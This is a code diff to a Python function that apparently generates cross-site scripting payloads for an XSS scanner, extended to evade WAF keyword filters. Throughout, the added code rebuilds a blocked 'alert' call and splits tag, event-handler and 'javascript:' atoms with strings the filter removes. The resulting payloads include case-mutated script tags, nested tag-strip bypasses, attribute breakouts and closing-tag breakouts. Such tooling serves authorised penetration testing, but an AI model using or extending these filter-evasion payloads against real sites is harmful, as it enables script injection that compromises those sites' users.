@@ -225,7 +225,7 @@ def compose(ctx, quote, scores, kw=None, kwv=None):
     marker = "vvm{id}"
 
     def add(payload, technique, case_ref):
-        if required_ok(payload, scores) and funcs:
+        if required_ok(payload, scores):
             out.append({
                 "payload": payload,
                 "technique": technique,
@@ -262,16 +262,27 @@ def compose(ctx, quote, scores, kw=None, kwv=None):
                 blocked; leave it unchanged when it passed."""
                 return word if kw.get(key, True) else split_str(word, s)
 
+            def rebuild_fn(s):
+                """funcs is empty -> every call primitive is blocked.
+                Rebuild 'alert' via splitter s + the call syntax that
+                survived; the mid-name split also breaks call_*/tick_*
+                junction signatures (request never contains 'alert(1)')."""
+                if kw.get("parentheses", True):
+                    return [split_str("alert", s) + "(1)"]
+                if kw.get("backtick", True):
+                    return [split_str("alert", s) + "`1`"]
+                return []
+
             if script_ok:
-                for fn in funcs:
+                for fn in funcs or (rebuild_fn(rsplit[0]) if rsplit else []):
                     add(f"<script {marker}>{fn}</script>", "script injection", "body_direct")
             else:
                 if kw.get("case_script", True):
-                    for fn in funcs[:2]:
+                    for fn in funcs[:2] or (rebuild_fn(rsplit[0]) if rsplit else []):
                         add(f"<ScRiPt {marker}>{fn}</ScRiPt>",
                             "case-mutated script tag", "tag_removed")
                 for s in rsplit[:3]:
-                    for fn in funcs[:2]:
+                    for fn in funcs[:2] or rebuild_fn(s):
                         add(f"{split_str('<script>', s)} {marker}>{fn}"
                             f"{split_str('</script>', s)}",
                             f"nested tag-strip bypass ({s} splitter)", "tag_removed")
@@ -281,16 +292,33 @@ def compose(ctx, quote, scores, kw=None, kwv=None):
                         add(f"<{tag} {extra} {marker} {ev}={fn}>".replace("  ", " "),
                             f"{tag} {ev} handler", "body_direct")
                 else:
-                    # tag name / event handler / function blocked: rebuild the
-                    # blocked atoms by splitting them with a removed string
+                    # Rebuild blocked atoms by nesting a removed string.
+                    # When ONLY the pair_* junction failed (e.g. the WAF
+                    # signs 'img onerror' while every atom passes), the tag
+                    # atom is split unconditionally — otherwise the emitted
+                    # payload still carries the contiguous signature and is
+                    # dead on arrival. Atom-blocked cases split only the
+                    # blocked atoms, keeping splitter occurrences minimal.
                     for s in rsplit[:2]:
-                        fn0 = funcs[0] if funcs else "alert(1)"
-                        fname = re.split(r"[(`]", fn0)[0]
-                        add(f"{fix(tag + '_tag', '<' + tag, s)} {extra} {marker} "
-                            f"{fix(ev, ev, s)}="
-                            f"{fix(fname, fname, s)}{fn0[len(fname):]}>"
-                            .replace("  ", " "),
-                            f"removed-string splitter ({s})", "tag_removed")
+                        atom_blocked = any(
+                            not kw.get(d, True)
+                            for d in deps if not d.startswith("pair_"))
+                        tag_atom = fix(tag + "_tag", "<" + tag, s) \
+                            if atom_blocked else split_str("<" + tag, s)
+                        for fn0 in funcs[:1] or rebuild_fn(s):
+                            if "=" in fn0:
+                                # in-attribute fallback already carries
+                                # 'onerror=' — emit it bare, tag split only
+                                add(f"{tag_atom} {extra} {marker} {fn0}>"
+                                    .replace("  ", " "),
+                                    f"removed-string splitter ({s})", "tag_removed")
+                                continue
+                            fname = re.split(r"[(`]", fn0)[0]
+                            add(f"{tag_atom} {extra} {marker} "
+                                f"{fix(ev, ev, s)}="
+                                f"{fix(fname, fname, s)}{fn0[len(fname):]}>"
+                                .replace("  ", " "),
+                                f"removed-string splitter ({s})", "tag_removed")
             if kw.get("javascript_proto", True) and \
                     kw.get("proto_href", True) and funcs:
                 add(f'<a {marker} href="javascript:{funcs[0]}">XSS</a>',
@@ -299,9 +327,10 @@ def compose(ctx, quote, scores, kw=None, kwv=None):
                     and funcs:
                 add(f'<a {marker} href="JaVaScRiPt:{funcs[0]}">XSS</a>',
                     "case-mutated javascript: href", "protocol")
-            if not kw.get("javascript_proto", True) and rsplit and funcs:
+            jfns = funcs[:1] or (rebuild_fn(rsplit[0]) if rsplit else [])
+            if not kw.get("javascript_proto", True) and rsplit and jfns:
                 add(f'<a {marker} href="{split_str("javascript:", rsplit[0])}'
-                    f'{funcs[0]}">XSS</a>',
+                    f'{jfns[0]}">XSS</a>',
                     f"removed-string splitter ({rsplit[0]})", "tag_removed")
             if kw.get("svg_tag", True) and not kw.get("onload", True) \
                     and kw.get("case_onload", True):
@@ -343,8 +372,8 @@ def compose(ctx, quote, scores, kw=None, kwv=None):
                 for fn in funcs[:2]:
                     add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'.replace("  ", " "),
                         "attribute breakout -> tag", "breakout_tag")
-            if script_ok:
-                add(f'{quote}><script {marker}>{funcs[0] if funcs else "alert(1)"}</script>',
+            if script_ok and funcs:
+                add(f'{quote}><script {marker}>{funcs[0]}</script>',
                     "attribute breakout -> script", "breakout_tag")
         elif q_ok:
             sep = quote if quote else " "
@@ -419,8 +448,8 @@ def compose(ctx, quote, scores, kw=None, kwv=None):
     elif ctx.startswith("consuming:"):
         tag = ctx.split(":", 1)[1]
         if tags_ok and slash_ok and kw.get(f"close_{tag}", True):
-            if script_ok:
-                add(f"</{tag}><script {marker}>{funcs[0] if funcs else 'alert(1)'}</script>",
+            if script_ok and funcs:
+                add(f"</{tag}><script {marker}>{funcs[0]}</script>",
                     f"{tag} close + script", "tag_breakout")
             if kw.get("img_tag", True) and kw.get("onerror", True) and funcs:
                 add(f'</{tag}><img src=x {marker} onerror={funcs[0]}>',
